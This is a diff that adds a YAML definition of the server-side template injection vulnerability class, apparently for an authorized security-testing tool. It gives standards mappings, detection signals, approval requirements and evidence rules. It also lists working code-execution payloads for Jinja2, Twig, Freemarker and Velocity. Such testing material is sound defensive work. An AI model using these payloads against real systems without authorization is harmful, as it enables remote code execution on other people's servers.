@@ -1,0 +1,108 @@
+id: rce-ssti
+name: Server-Side Template Injection (SSTI)
+category: rce
+description: >
+  User input is embedded in a server-side template without sanitization,
+  allowing the attacker to inject template syntax that is evaluated by the
+  template engine. Depending on the engine (Jinja2, Twig, Freemarker, ERB,
+  Velocity, Smarty, Mako), this can lead to arbitrary code execution, file
+  reads, or sensitive data exposure. Found in email templates, report
+  generators, custom page builders, and notification systems.
+severity: critical
+standards:
+  wstg:
+    - WSTG-INPV-15
+  asvs:
+    - "V5.3.8"
+  vrt:
+    - server_side_template_injection
+  cwe:
+    - CWE-94
+applies_to:
+  archetypes:
+    - all
+  surfaces:
+    - email-template-editors
+    - report-generators
+    - notification-systems
+    - custom-page-builders
+    - error-pages-with-user-input
+requires:
+  auth: single_account
+  inputs:
+    - parameters rendered in templates (name, title, description fields)
+    - error pages that include user input
+    - email or notification preview endpoints
+  tools:
+    - curl
+    - tplmap
+signals:
+  positive:
+    - Template expression evaluated and result in response (49 = 49 for {{7*7}})
+    - Template syntax error message visible in response
+    - Different template expressions produce different output (engine fingerprint)
+    - tplmap reports injectable parameter
+    - Successful code execution or file read via template payloads
+  negative:
+    - Template syntax escaped/sanitized before rendering
+    - Client-side template rendering only (mustache.js, Handlebars in browser)
+    - Input rendered but template syntax appears verbatim (not evaluated)
+    - Static site pre-rendering (no runtime template evaluation)
+    - CSP or sandbox prevents execution even if injection succeeds
+safety:
+  intrusive: true
+  data_modifying: false
+  rate_limited: false
+  requires_approval: true
+evidence:
+  required:
+    - curl showing template expression evaluation ({{7*7}} = 49)
+    - Engine fingerprint (template engine identified)
+    - Proof of code execution or file read via SSTI
+    - tplmap output log
+references:
+  urls:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_SSTI
+    - https://portswigger.net/research/server-side-template-injection
+    - https://github.com/epinna/tplmap
+  papers:
+    - Server-Side Template Injection (James Kettle, PortSwigger 2015)
+  writeups: []
+workflow_mapping:
+  skill: rce
+  workflow: W2 (SSTI)
+payload_families:
+  - name: engine_fingerprint
+    description: Polyglot payloads to identify template engine
+    examples:
+      - "{{7*'7'}}"
+      - "${7*7}"
+      - "<%= 7*7 %>"
+      - "#{7*7}"
+      - "${{7*7}}"
+  - name: jinja2_rce
+    description: Jinja2 / Flask code execution payloads
+    examples:
+      - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      - "{{''.__class__.__mro__[2].__subclasses__()}}"
+  - name: twig_rce
+    description: Twig / Symfony code execution
+    examples:
+      - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+  - name: freemarker_rce
+    description: Freemarker / Java template execution
+    examples:
+      - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+  - name: velocity_rce
+    description: Velocity / Java template execution
+    examples:
+      - "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($ex=$rt.getRuntime().exec('id'))"
+tags:
+  - template
+  - ssti
+  - jinja2
+  - twig
+  - freemarker
+  - code-execution
+  - critical
+  - requires-approval
